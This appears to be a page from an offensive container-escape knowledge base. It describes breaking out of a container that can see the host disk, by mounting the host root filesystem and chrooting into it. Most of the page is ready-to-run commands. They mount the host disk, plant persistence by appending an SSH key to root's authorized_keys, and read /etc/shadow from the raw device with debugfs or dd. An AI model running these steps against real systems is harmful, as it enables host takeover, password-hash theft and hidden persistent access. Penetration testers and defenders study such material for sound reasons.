---
title: "Host block device: mounting the host disk from inside a container"
description: "A container that can see the host block device node (for example /dev/sda or /dev/nvme0n1) and holds CAP_SYS_ADMIN can mount the host root filesystem and chroot into it, gaining full read-write access to every host file. This is the fastest interactive container escape when raw block devices are exposed."
keywords:
  - host block device
  - mount host disk
  - chroot escape
  - nvme sda
  - container escape
---

# Host block device

When the host's block device node is visible inside the container and the process can mount, the container reads and writes the host's real filesystem. The device node points at the host disk driver, so mounting it exposes the actual root filesystem rather than any container copy. This is the most direct interactive escape: mount, `chroot`, and you are root on the host filesystem.

Identify the device and its filesystem:

```bash
lsblk -f 2>/dev/null                    # device, FSTYPE, and existing mountpoint
cat /proc/partitions                    # major/minor and size if lsblk is absent
fdisk -l 2>/dev/null | grep -E 'Linux|/dev/(sd|nvme|vd)'
```

The host root is usually the largest partition with an `ext4`/`xfs`/`btrfs` filesystem, for example `/dev/sda1`, `/dev/nvme0n1p2`, or an LVM mapper node like `/dev/mapper/vg0-root`.

## Mount and chroot

```bash
mkdir -p /mnt/host
mount /dev/nvme0n1p2 /mnt/host          # mount the host root filesystem
chroot /mnt/host /bin/bash              # become root in the host's file view
# persist: add an SSH key, a systemd unit, or a sudoers entry
echo 'ssh-ed25519 AAAA... a' >> /mnt/host/root/.ssh/authorized_keys
```

For LVM, device-mapper, or RAID roots the target is the mapper node; `lsblk -f` shows which node carries the root filesystem and mountpoint. For a btrfs root you may need `-o subvol=@` to land on the correct subvolume.

## When mount is blocked

Mounting needs `CAP_SYS_ADMIN` and an unfiltered `mount` syscall. If the capability is present but a seccomp profile blocks `mount`, this route fails; confirm with a throwaway `mount -t tmpfs none /mnt`. If only the device is present without the capability, read the raw device instead:

```bash
# carve files directly from the raw device without mounting
dd if=/dev/nvme0n1p2 bs=1M count=64 2>/dev/null | strings | grep -i 'root:.*:0:0'
debugfs -R 'cat /etc/shadow' /dev/nvme0n1p2 2>/dev/null   # ext4 read without mount
```

## Exploitation notes

- Visible block device nodes almost always mean `--privileged` or an explicit `--device`; the device cgroup `devices.list` confirms what is permitted.
- Mounting read-write lets you plant persistence; if you only need secrets, a read-only mount or the `debugfs`/`dd` carving avoids changing host state and journaling noise.
- This route pairs with [CAP_SYS_ADMIN](../capability-abuse/cap-sys-admin.md) for the mount and overlaps the host-disk route on [Privileged flag](../privileged-flag.md).

## Tools

- [debugfs (ext2/3/4 offline access, part of e2fsprogs)](https://e2fsprogs.sourceforge.net/)

## References

- [man 8 mount](https://man7.org/linux/man-pages/man8/mount.8.html)
- [HackTricks: Docker breakout / privileged](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
